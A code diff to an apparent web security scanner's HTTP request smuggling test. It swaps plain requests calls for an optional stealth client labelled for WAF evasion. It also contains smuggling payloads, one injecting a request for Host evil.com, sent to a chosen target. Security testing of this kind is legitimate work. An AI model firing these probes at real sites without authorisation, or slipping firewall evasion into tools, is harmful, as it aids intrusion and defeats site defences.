@@ -10,7 +10,21 @@ import os
 import time
 from typing import Any, Dict, List
 
-import requests
+# Import stealth HTTP client for WAF evasion
+try:
+    from tools.http_client import safe_get, safe_post, get_stealth_session
+    USE_STEALTH = True
+except ImportError:
+    import requests
+    USE_STEALTH = False
+    
+    def safe_get(url, **kwargs):
+        return requests.get(url, **kwargs)
+    
+    def safe_post(url, **kwargs):
+        return requests.post(url, **kwargs)
+
+
 
 
 def test_smuggling(target_url: str) -> Dict[str, Any]:
@@ -29,7 +43,7 @@ def test_smuggling(target_url: str) -> Dict[str, Any]:
         data = "0\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"
         
         start = time.time()
-        resp = requests.post(target_url, headers=headers, data=data, timeout=10)
+        resp = safe_post(target_url, headers=headers, data=data, timeout=10)
         elapsed = time.time() - start
         
         result["tests"].append({
@@ -50,7 +64,7 @@ def test_smuggling(target_url: str) -> Dict[str, Any]:
         data = "0\r\n\r\nX"
         
         start = time.time()
-        resp = requests.post(target_url, headers=headers, data=data, timeout=10)
+        resp = safe_post(target_url, headers=headers, data=data, timeout=10)
         elapsed = time.time() - start
         
         result["tests"].append({
